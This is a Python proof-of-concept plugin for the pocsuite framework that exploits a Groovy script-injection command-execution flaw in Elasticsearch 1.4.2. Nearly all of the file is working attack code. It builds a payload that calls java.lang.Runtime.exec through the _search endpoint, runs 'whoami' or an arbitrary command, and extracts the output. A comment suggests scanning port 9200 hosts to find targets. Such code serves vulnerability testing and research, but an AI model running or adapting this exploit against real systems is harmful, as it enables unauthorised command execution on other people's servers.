#!/usr/bin/env python
# coding: utf-8

import urllib
import random
import string
from collections import OrderedDict
import re
from pocsuite.api.request import req  #用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    PocName = 'elasticsearch_exec '
    vulID = '1'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = 'lyb'  #  PoC作者的大名
    vulDate = '2018/5/24'  #漏洞公开的时间,不知道就写今天
    createDate = '2018/5/24'  # 编写 PoC 的日期
    updateDate = '2018/5/24'  # PoC 更新的时间,默认和编写时间一样
    references = [
        'https://www.waitalone.cn/elasticsearch-exp.html']  # 漏洞地址来源,0day不用写
    name = 'elasticsearch 命令执行漏洞 PoC'  # PoC 名称
    appPowerLink = 'elasticsearch'  # 漏洞厂商主页地址
    appName = 'elasticsearch'  # 漏洞应用名称
    appVersion = '1.4.2'  # 漏洞影响版本
    vulType = 'Command Execution'  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        elasticsearch命令执行。
    '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写

    def _elastic(self,url,cmd):
        """
        Elastic search 命令执行函数
        漏洞详情:http://zone.wooyun.org/content/18915
        测试案例:请自行扫描9200端口的网站吧。
        """
        results = []
        elastic_url = url + '_search?pretty'
        exp = '{"size":1,"script_fields": ' \
              '{"iswin": {"script":"java.lang.Math.class.forName(\\"java.lang.Runtime\\")' \
              '.getRuntime().exec(\\"' + cmd + '\\").getText()","lang": "groovy"}}}'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        content = req.post(elastic_url, data=exp, headers=headers, timeout=10).content
        result = re.findall(re.compile('\"iswin\" : \[ "(.*?)" \]'), content)
        if result:
            results.append(result[0])
        return results
    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        cmd="whoami"
        if self.url[-1] != '/': self.url += '/'
        elastic_url = self.url + '_search?pretty'
        exp = '{"size":1,"script_fields": ' \
              '{"iswin": {"script":"java.lang.Math.class.forName(\\"java.lang.Runtime\\")' \
              '.getRuntime().exec(\\"' + cmd + '\\").getText()","lang": "groovy"}}}'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        content = req.post(elastic_url, data=exp, headers=headers, timeout=10).content
        resp = re.findall(re.compile('\"iswin\" : \[ "(.*?)" \]'), content)
        if resp:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)
